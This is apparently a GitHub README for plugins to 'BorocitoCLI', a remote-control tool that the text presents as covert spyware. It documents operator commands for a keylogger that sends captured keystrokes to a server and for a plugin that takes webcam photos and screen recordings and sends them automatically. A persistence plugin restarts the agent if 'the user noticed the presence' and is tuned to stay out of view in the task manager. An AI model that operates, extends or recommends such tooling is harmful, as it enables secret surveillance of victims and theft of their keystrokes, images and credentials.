# borocito-components
Complementos para Borocito CLI

## Complements
These plugins were created to enrich the experience with BorocitoCLI.

They're not perfect, but they're not disappointing either. Well, it really depends on how they're made. I invite you to contribute to the development of these, if there is something, an error, bug, an idea, etc, contribute, I will greatly appreciate it, and those of us who use these complements too.

### Using it
All plugins here, except for the 'boro-get' package manager, were created by Zhenboro. Yeah, and besides the fact that I made them, they need to be installed by 'boro-get'.
boro-get is a module within BorocitoCLI. It's totally inside, well implemented. So, initially, there should be no problem.

#### boro-get
This must be installed, by default it is not implemented. It should be installed using the command `boro-get install`, to check if it is installed or not, use `boro-get status`, if it is already installed, great!
Now, if you want to be sure the latest version is installed, use `boro-get uninstall`, that will uninstall boro-get. Then you can use the `boro-get install` command to download and install the latest version available on the server indicated in the file: GlobalSettings.ini
```sh
[Components]
boro-get=http://chemic-jug.000webhostapp.com/Borocito/Boro-Get/boro-get.zip
```
Now that boro-get is installed. We can start installing and using the packages.

We can install a package with the command `boro-get <package> <start?> <parameters>`
An example with broKiloger:
`boro-get broKiloger True /startrecording`
If the package does not require an argument:
`boro-get broKiloger`
(<start?> will be marked as True, the package will start)

If you don't want to start it (just download and install it)
`boro-get broKiloger False null`

>NOTE: 'null' is a reserved word, it will be very useful!

Now we are going to define a concept.
**Single Instance Package**: A package with this warning means that only one instance of it will be started. Just one.
These are designed to do unique unrepeatable things. Like a keylogger. This is something global, why another instance?
Also, they can receive parameters when they are already started, so you can control them.

### boro-hear
boro-hear is a module that allows plugins to communicate (one-way C->S) with the Control Panel.

If you make a plugin, you can make it send messages to the control panel. In your code you should put something like [this code](https://github.com/Zhenboro/borocito-components/blob/e7eda70b99cfcfa2ea3a66223cc3564703051f29/broKiloger/Utility.vb#L8-L51).
That will start an instance of boro-hear which will send your message to the server. boro-hear is single-instance, but messages can be sent by passing parameters to it. These are picked up by boro-hear via the StartUpNextInstance event.


### broEstoraje
This plugin is not coded yet.
It is used to explore files. Basically [RMTFS](https://github.com/Zhenboro/RMTFS) adapted to work with FTP (or IDFTP).

### broKiloger
broKiloger is a plugin dedicated to logging keys.

> NOTE: Single Instance Package

Your options are:
```sh
/startrecording: It will start key recording.
boro-get broKiloger True /startrecording
```
```sh
/stoprecording: It will stop the key recording and broKiloger will close.
boro-get broKiloger True /stoprecording
```
> NOTE: It will not save or send the record.

```sh
/sendrecord: It will send the keylogger and then start recording again.
boro-get broKiloger True /sendrecord
```

```sh
/resetrecord: It will clean the keylogger.
boro-get broKiloger True /resetrecord
```
> NOTE: It will not save or send the record.

```sh
/sendandexit: It will send the keylogging and then broKiloger will close.
boro-get broKiloger True /sendandexit
```

### broRescue
This plugin was created because it turns out that sometimes an instance of BorocitoCLI can be closed by some external or internal factor. Perhaps the user noticed the presence and closed it, or, a command left a mess that BorocitoCLI couldn't handle.
For this reason, broRescue is a good recommendation that it be installed.
**And what does it do?**
Well it's simple. If you notice that BorocitoCLI has closed. You can make broRescue restart the BorocitoCLI instance by using the command:
`broRescue Borocito`
and not only that, you can also start the extractor, or the updater.
To do this, the commands will be:
`broRescue Extractor`
`broRescue Updater`
Or even restart the computer with the command:
`broRescue Restart`
This packet reads directly from the server. Every 20 minutes. So yes, you will notice the effect in 20 minutes. And that is done so as not to load the server, and also so that it is not noticed from the task manager.

### broScrincam
This plugin is for:
- Take photos from a Webcam
- Record video from a Webcam
- Record screen

> NOTE: Single Instance Package

```sh
/startscreenrecording: (will try) record the screen.
boro-get broScrincam True /startscreenrecording
```

```sh
/stopscreenrecording: It is supposed to stop screen recording. That part is not scheduled yet.
boro-get broScrincam True /stopscreenrecording
```
> NOTE: It will not save or send the record. Not coded yet.

```sh
/startcamrecording: It will start to record video from the webcam
boro-get broScrincam True /startcamrecording
```

```sh
/takecampicture: It will take a screenshot of the webcam
boro-get broScrincam True /takecampicture
```
> NOTE: It will be sent automatically.

```sh
/stopcamrecording: It will stop the Webcam recording.
boro-get broScrincam True /stopcamrecording
```
> NOTE: It will not save or send the record.

```sh
/sendscreenrecord: It is supposed to stop, save and send the screen recording. This part is not coded yet.
boro-get broScrincam True /sendscreenrecord
```
> NOTE: Not coded yet.

```sh
/sendcamrecord: It will stop the Webcam recording and send it automatically.
boro-get broScrincam True /sendcamrecord
```
> NOTE: It will be sent automatically.

```sh
/stop: It will send the keylogger and then start recording again.
boro-get broScrincam True /stop
```
